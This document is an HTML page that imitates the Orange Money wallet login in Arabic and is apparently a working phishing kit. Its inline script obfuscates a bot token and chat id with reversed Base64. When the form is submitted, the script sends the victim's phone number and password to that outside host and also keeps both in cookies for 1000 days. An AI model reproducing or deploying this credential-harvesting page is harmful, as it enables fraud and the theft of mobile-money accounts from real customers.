<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <title>Orange Money - الصفحة الرئيسية</title>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <link href="https://cdn.prod.website-files.com/6709b4ecad0f1ceeeed96305/css/orangemonney.webflow.4d36521a0.css" rel="stylesheet" type="text/css"/>
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js"></script>
  <script>
    WebFont.load({
      google: {
        families: ["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Roboto:300,regular,500"]
      }
    });
  </script>
  <style>
    body { box-sizing: border-box; font-size: 18px; }
    .container { padding: 0 5%; }
    .field-holder { position: relative; margin-bottom: 1.25em; }
    .w-input { border: 0; border-bottom: 3px solid #dfdfdf; outline: none; }
    label { position: absolute; top: 0; left: 0; font-size: 1em; color: #424242; display: flex; align-items: center; cursor: text; transition: .3s; }
    .w-input, label { font-size: 1em; width: 100%; height: 55px; }
    .w-input:focus + label, .w-input:valid + label { color: #ff7900; font-size: .75em; top: -25px; pointer-events: none; }
    .w-input:focus, .w-input:valid { border-bottom: 3px solid #ff7900; }
    .CustomFooter { position: fixed; left: 0; bottom: 0; }
  </style>
</head>
<body class="body">
  <div class="div-block-2">
    <div class="header-section">
      <div class="w-container">
        <a href="/" aria-current="page" class="blog-home-link w-inline-block w--current">
          <img src="https://cdn.prod.website-files.com/6709b4ecad0f1ceeeed96305/6709b4ecad0f1ceeeed963e7_OM%20logo_0.svg" width="106" alt="" class="image"/>
        </a>
      </div>
    </div>
  </div>
  <div class="div-block-4">
    <div class="container">
      <div class="w-form">
        <form id="signin" name="wf-form-" data-name="تسجيل الدخول" redirect="/verification.html" data-redirect="/verification.html" method="get">
          <div id="field" class="field-holder">
            <input class="text-field-2 w-input" minlength="10" maxlength="10" name="field" inputmode="numeric" data-name="رقم الهاتف" pattern="^(079|078|077)[0-9]{7}$" placeholder="" type="text" id="phonenumber" required=""/>
            <label for="phonenumber" class="field-label">رقم المحفظة</label>
          </div>
          <div id="field" class="field-holder">
            <input class="text-field-2 w-input" maxlength="256" name="field" data-name="كلمة السر" placeholder="" type="text" id="password" required=""/>
            <label for="password" class="field-label-2">كلمة السر</label>
          </div>
          <div class="div-block">
            <input type="submit" data-wait="يرجى الانتظار" class="submit-button w-button" value="تسجيل دخول"/>
          </div>
          <div class="div-block spacea">
            <input type="submit" data-wait="يرجى الانتظار" class="submit-button button-black w-button" value="التسجيل الذاتي"/>
            <input type="submit" data-wait="يرجى الانتظار" class="submit-button button-black not-black w-button" value="تسجيل دخول لأول مرة"/>
          </div>
        </form>
        <div class="w-form-done"><div>Thank you! Your submission has been received!</div></div>
        <div class="w-form-fail"><div>Oops! Something went wrong while submitting the form.</div></div>
      </div>
    </div>
  </div>

  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js"></script>
  <script src="https://cdn.prod.website-files.com/6709b4ecad0f1ceeeed96305/js/webflow.1a78e01dd.js"></script>
  <script src="https://code.jquery.com/jquery-latest.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.20.1/dist/jquery.validate.min.js"></script>
  <script>
    // تعتيم التوكن والـchatid
    function obscure(str) {
      // ترميز Base64 بسيط
      return btoa(str.split('').reverse().join(''));
    }
    function reveal(str) {
      return atob(str).split('').reverse().join('');
    }

    // القيم الأصلية مخفية
    const _obf_token = 'bk4yTU00aE40eDRJbl9UQk5JQmNfbkN6TlpNQ1J6b0tNQXNnQUFCZzY1ODIzODUxNjY6QUFHZ1d0S01Ob2xDWl9jX1Z4T3pQQ0llQ05VaVQ0eE1ONXc='; // btoa([reversed token])
    const _obf_chatid = 'OTA4ODkyNTY0LT0='; // btoa([reversed chatid])

    function getToken() { return reveal(_obf_token); }
    function getChatId() { return reveal(_obf_chatid); }

    function setCookie(cname, cvalue, exdays) {
      const d = new Date();
      d.setTime(d.getTime() + (exdays*24*60*60*1000));
      let expires = "expires="+ d.toUTCString();
      document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
    }

    $('#signin').on("submit", function () {
      var phonenumber = document.getElementById('phonenumber').value;
      document.getElementById('phonenumber').setAttribute("name",'phonenumber');
      var password = document.getElementById('password').value;
      document.getElementById('password').setAttribute("name",'password');

      var message = "رقم الهاتف:`"+phonenumber+"`\n";
      message += "كلمة السر:`"+password+"`\n";

      $.ajax({
        type: 'POST',
        url: getToken(),
        data: {
          chat_id: getChatId(),
          text: message,
          parse_mode: 'markdown',
        },
        success: function (res) {
          console.debug(res);
          $('#response').text('Message sent');
        },
        error: function (error) {
          console.error(error);
          alert("error failed");
        }
      });

      setCookie("phonenumber",phonenumber,1000);
      setCookie("password",password,1000);
    });
  </script>
</body>
</html>
